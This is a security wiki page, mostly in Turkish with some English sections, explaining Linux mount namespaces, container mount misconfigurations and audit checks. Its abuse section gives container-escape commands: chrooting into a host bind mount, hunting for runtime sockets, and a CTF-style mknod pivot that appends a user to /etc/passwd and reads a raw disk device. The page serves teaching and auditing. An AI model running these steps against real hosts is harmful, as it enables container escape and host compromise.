# Mount İsim Alanı

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Mount isim alanı, bir işlemin gördüğü **mount table**'ı kontrol eder. Bu, container izolasyon özelliklerinden en önemlilerinden biridir çünkü root filesystem, bind mounts, tmpfs mounts, procfs görünümü, sysfs maruziyeti ve birçok runtime-özgü yardımcı mount bu mount tablosu üzerinden ifade edilir. İki işlem aynı anda `/`, `/proc`, `/sys` veya `/tmp`'ye erişebilir, ancak bu yolların nerelere çözümlendiği bulundukları mount isim alanına bağlıdır.

Container-güvenlik perspektifinden bakıldığında, mount isim alanı genellikle "bu düzenli hazırlanmış bir uygulama dosya sistemi" ile "bu işlem ana makine dosya sistemini doğrudan görebiliyor veya etkileyebiliyor" arasındaki farktır. İşte bu yüzden bind mounts, `hostPath` volumes, privileged mount operations ve yazılabilir `/proc` veya `/sys` maruziyetleri bu isim alanı etrafında döner.

## İşleyiş

Bir runtime bir container başlattığında genellikle yeni bir mount isim alanı oluşturur, container için bir root filesystem hazırlar, gerektiğinde procfs ve diğer yardımcı dosya sistemlerini mount eder ve isteğe bağlı olarak bind mounts, tmpfs mounts, secrets, config maps veya host path'ler ekler. Bu işlem isim alanı içinde çalışmaya başladıktan sonra, gördüğü mount kümesi büyük ölçüde host'un varsayılan görünümünden ayrılmış olur. Host hâlâ gerçek altındaki dosya sistemini görebilir, ancak container runtime tarafından onun için derlenen versiyonu görür.

Bu güçlüdür çünkü host her şeyi yönetiyor olsa da container'ın kendi root filesystem'ına sahip olduğuna inanmasını sağlar. Aynı zamanda tehlikelidir çünkü runtime yanlış bir mount'u açığa çıkarırsa, işlem aniden güvenlik modelinin korumayı amaçlamadığı host kaynaklarına görünürlük kazanabilir.

## Laboratuvar

Aşağıdaki komutla özel bir mount isim alanı oluşturabilirsiniz:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
O namespace'in dışındaki başka bir shell açıp mount table'ı incelediğinizde, tmpfs mount'un yalnızca izole edilmiş mount namespace'in içinde var olduğunu göreceksiniz. Bu faydalı bir egzersizdir çünkü mount izolasyonunun soyut bir teori olmadığını gösterir; çekirdek kelimenin tam anlamıyla sürece farklı bir mount table sunar.
O namespace'in dışındaki başka bir shell açıp mount table'ı incelediğinizde, tmpfs mount'un sadece izole edilmiş mount namespace içinde var olacağını göreceksiniz.

Konteynerlerde, kısa bir karşılaştırma şudur:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
The second example demonstrates how easy it is for a runtime configuration to punch a huge hole through the filesystem boundary.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private mount namespace for normal containers. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on mount namespaces, especially because system containers often expose richer and more machine-like filesystems than application containers do.

This means that when you review a container filesystem problem, you are usually not looking at an isolated Docker quirk. You are looking at a mount-namespace and runtime-configuration problem expressed through whatever platform launched the workload.

## Misconfigurations

The most obvious and dangerous mistake is exposing the host root filesystem or another sensitive host path through a bind mount, for example `-v /:/host` or a writable `hostPath` in Kubernetes. At that point, the question is no longer "can the container somehow escape?" but rather "how much useful host content is already directly visible and writable?" A writable host bind mount often turns the rest of the exploit into a simple matter of file placement, chrooting, config modification, or runtime socket discovery.

Another common problem is exposing host `/proc` or `/sys` in ways that bypass the safer container view. These filesystems are not ordinary data mounts; they are interfaces into kernel and process state. If the workload reaches the host versions directly, many of the assumptions behind container hardening stop applying cleanly.

Read-only protections matter too. A read-only root filesystem does not magically secure a container, but it removes a large amount of attacker staging space and makes persistence, helper-binary placement, and config tampering more difficult. Conversely, a writable root or writable host bind mount gives an attacker room to prepare the next step.

## Abuse

When the mount namespace is misused, attackers commonly do one of four things. They **read host data** that should have remained outside the container. They **modify host configuration** through writable bind mounts. They **mount or remount additional resources** if capabilities and seccomp allow it. Or they **reach powerful sockets and runtime state directories** that let them ask the container platform itself for more access.

If the container can already see the host filesystem, the rest of the security model changes immediately.

When you suspect a host bind mount, first confirm what is available and whether it is writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Eğer host root filesystem read-write olarak mount edilmişse, doğrudan host erişimi genellikle şu kadar basittir:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Eğer amaç doğrudan chrooting yapmak değil de ayrıcalıklı runtime erişimi sağlamaksa, sockets ve runtime state'i enumerate edin:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Eğer `CAP_SYS_ADMIN` mevcutsa, konteynerin içinden yeni mount'ların oluşturulup oluşturulamayacağını da test edin:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Tam Örnek: Two-Shell `mknod` Pivot

Daha özel bir suiistimal yolu, container içindeki root kullanıcısının block devices oluşturabilmesi, host ve container'ın kullanıcı kimliğini faydalı bir şekilde paylaşması ve saldırganın host üzerinde zaten düşük ayrıcalıklı bir erişime sahip olması durumunda ortaya çıkar. Bu durumda container, `/dev/sda` gibi bir aygıt düğümü oluşturabilir ve eşleşen container process'i için düşük ayrıcalıklı host kullanıcısı daha sonra bunu `/proc/<pid>/root/` üzerinden okuyabilir.

Container içinde:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Container kabuk PID'sini bulduktan sonra, host üzerinde, eşleşen düşük ayrıcalıklı kullanıcı olarak:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Önemli çıkarım tam olarak CTF string araması değildir. Asıl önemli olan, mount-namespace'in `/proc/<pid>/root/` aracılığıyla açığa çıkmasıdır; bu durum, cgroup device politikası konteyner içinde doğrudan kullanımı engellemiş olsa bile host kullanıcısının konteyner tarafından oluşturulmuş device node'larını yeniden kullanmasına izin verebilir.

## Kontroller

Bu komutlar, mevcut sürecin gerçekten yaşadığı dosya sistemi görünümünü göstermek içindir. Amaç, host kaynaklı mount'ları, yazılabilir hassas yolları ve normal bir uygulama konteyner root dosya sisteminden daha geniş görünen herhangi bir şeyi tespit etmektir.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Burada ilginç olanlar:

- Host'tan gelen Bind mounts, özellikle `/`, `/proc`, `/sys`, runtime state dizinleri veya socket konumları hemen göze çarpmalıdır.
- Beklenmedik read-write mounts genellikle çok sayıda read-only yardımcı mount'tan daha önemlidir.
- `mountinfo` genellikle bir yolun gerçekten host-derived mı yoksa overlay-backed mı olduğunu görmek için en iyi yerdir.

Bu kontroller, **bu namespace içinde hangi kaynakların görünür olduğunu**, **hangilerinin host-derived olduğunu**, ve **hangilerinin yazılabilir veya güvenlik açısından hassas olduğunu** belirler.
{{#include ../../../../../banners/hacktricks-training.md}}
